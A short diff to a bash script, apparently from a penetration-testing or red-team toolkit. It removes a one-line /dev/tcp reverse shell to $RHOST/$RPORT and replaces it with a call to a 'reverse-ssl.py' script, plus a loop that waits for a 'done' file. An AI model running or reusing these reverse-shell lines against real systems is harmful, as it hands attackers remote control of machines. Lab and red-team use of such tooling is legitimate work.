@@ -1,3 +1,10 @@
 #!/usr/bin/env bash
-0<&217-;exec 217<>/dev/tcp/$RHOST/$RPORT;sh <&217 >&217 2>&217
+python reverse-ssl.py
+if [[ -z "$NOWAIT" ]]; then
+    echo "waiting for $PWD/done"
+	while [[ ! -f done ]]; do
+		sleep 5
+	done
+	rm -f done
+fi
 exit 0
